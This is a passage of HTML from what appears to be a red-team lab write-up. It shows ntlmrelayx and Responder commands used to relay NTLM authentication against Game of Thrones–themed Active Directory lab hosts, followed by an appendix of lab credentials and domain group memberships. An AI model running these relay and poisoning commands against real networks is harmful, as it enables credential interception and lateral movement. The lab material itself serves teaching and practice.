+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">impacket-ntlmrelayx</span> <span class="n">-tf</span> <span class="nb">relay-targets</span><span class="p">.</span><span class="py">txt</span> <span class="n">-smb2support</span> <span class="n">-socks</span>  
+</span></span></code></pre></div><div>
+        <img src="/posts/2024-06-21_red_team07/images/start-ntlmrelayx.png" alt="no image" />
+</div>
+<ul>
+<li>Start responder as well</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">responder</span> <span class="n">-I</span> <span class="n">eth1</span>
+</span></span></code></pre></div><ul>
+<li>After a while we see this output where <code>eddard.stark</code> is able to authenticate to the <code>mereen</code> and <code>braavos</code> server.</li>
+</ul>
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/edd-auth.png" alt="no image" />
+</div>
+<ul>
+<li>If we type the command <code>socks</code>, we can also see the admin status of our connection to the machines</li>
+</ul>
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/socks.png" alt="no image" />
+</div>
+<h2 id="appendix" class="relative group">Appendix <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#appendix" aria-label="Anchor">#</a></span></h2>
+<h3 id="valid-credentials" class="relative group">Valid Credentials <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#valid-credentials" aria-label="Anchor">#</a></span></h3>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>samwell.tarly</td>
+<td>Heartsbane</td>
+</tr>
+<tr>
+<td>hodor</td>
+<td>hodor</td>
+</tr>
+<tr>
+<td>brandon.stark</td>
+<td>iseedeadpeople</td>
+</tr>
+<tr>
+<td>robb.stark</td>
+<td>sexywolfy</td>
+</tr>
+</tbody>
+</table>
+<h3 id="valid-users" class="relative group">Valid Users <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#valid-users" aria-label="Anchor">#</a></span></h3>
+<table>
+<thead>
+<tr>
+<th>Group</th>
+<th>RID</th>
+<th>Members</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mormont</td>
+<td>1108</td>
+<td>NORTH\jeor.mormont</td>
+</tr>
+<tr>
+<td>Night Watch</td>
+<td>1107</td>
+<td>NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont</td>
+</tr>
+<tr>
+<td>Domain Guests</td>
+<td>514</td>
+<td>NORTH\Guest</td>
+</tr>
+<tr>
+<td>Group Policy Creator Owners</td>
+<td>520</td>
+<td>NORTH\Administrator</td>
+</tr>
+<tr>
+<td>Domain Computers</td>
+<td>515</td>
+<td>NORTH\CASTELBLACK$</td>
+</tr>
+<tr>
+<td>Stark</td>
+<td>1106</td>
+<td>NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow</td>
+</tr>
+<tr>
+<td>Domain Users</td>
+<td>513</td>
+<td>NORTH\Administrator, NORTH\vagrant, NORTH\krbtgt, NORTH\SEVENKINGDOMS$, NORTH\arya.stark, NORTH\eddard.stark, NORTH\catelyn.stark, NORTH\robb.stark, NORTH\sansa.stark, NORTH\brandon.stark, NORTH\rickon.stark, NORTH\hodor, NORTH\jon.snow, NORTH\samwell.tarly, NORTH\jeor.mormont, NORTH\sql_svc</td>
+</tr>
+</tbody>
+</table>
 
       </div>
     </section>
